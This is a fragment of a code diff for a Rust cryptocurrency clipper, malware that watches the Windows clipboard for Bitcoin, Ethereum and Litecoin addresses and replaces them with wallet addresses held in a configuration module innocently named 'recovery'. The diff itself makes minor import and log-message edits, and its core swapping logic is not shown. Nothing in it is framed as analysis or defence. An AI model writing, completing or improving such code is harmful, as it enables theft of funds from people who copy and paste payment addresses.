@@ -1,11 +1,9 @@
 use crate::recovery::settings::RecoveryControl;
 use regex::Regex;
-use std::sync::Arc;
 use tokio::time::{Duration, sleep};
 use tracing::{debug, info};
 use once_cell::sync::Lazy;
 
-// Common Regex Patterns for Crypto Addresses
 static BTC_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,59})$").unwrap());
 static ETH_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap());
 static LTC_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$").unwrap());
@@ -22,7 +20,7 @@ pub async fn run_clipper() {
         return;
     }
 
-    info!("starting active clipper background thread");
+    info!("starting Clipper background thread");
     
     let btc = control.btc_address().map(|s| s.to_string());
     let eth = control.eth_address().map(|s| s.to_string());
@@ -146,7 +144,7 @@ pub async fn run_clipper() {
 fn get_clipboard_text() -> Option<String> {
     #[cfg(windows)]
     {
-        use windows::Win32::Foundation::{HWND, HANDLE, HGLOBAL};
+        use windows::Win32::Foundation::{HWND, HGLOBAL};
         use windows::Win32::System::DataExchange::{OpenClipboard, CloseClipboard, GetClipboardData, IsClipboardFormatAvailable};
         use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock, GlobalSize};
         use windows::Win32::System::Ole::CF_UNICODETEXT;
@@ -186,7 +184,7 @@ fn get_clipboard_text() -> Option<String> {
 fn set_clipboard_text(text: &str) -> bool {
     #[cfg(windows)]
     {
-        use windows::Win32::Foundation::{HWND, HGLOBAL};
+        use windows::Win32::Foundation::HWND;
         use windows::Win32::System::DataExchange::{OpenClipboard, CloseClipboard, EmptyClipboard, SetClipboardData};
         use windows::Win32::System::Memory::{GlobalAlloc, GlobalLock, GlobalUnlock, GHND};
         use windows::Win32::System::Ole::CF_UNICODETEXT;
@@ -207,7 +205,7 @@ fn set_clipboard_text(text: &str) -> bool {
                         std::ptr::copy_nonoverlapping(utf16.as_ptr(), ptr as *mut u16, utf16.len());
                         let _ = GlobalUnlock(hglobal);
                         
-                        if SetClipboardData(CF_UNICODETEXT.0 as u32, HANDLE(hglobal.0 as *mut _)).is_ok() {
+                        if SetClipboardData(CF_UNICODETEXT.0 as u32, HANDLE(hglobal.0 as isize)).is_ok() {
                             success = true;
                         }
                     }
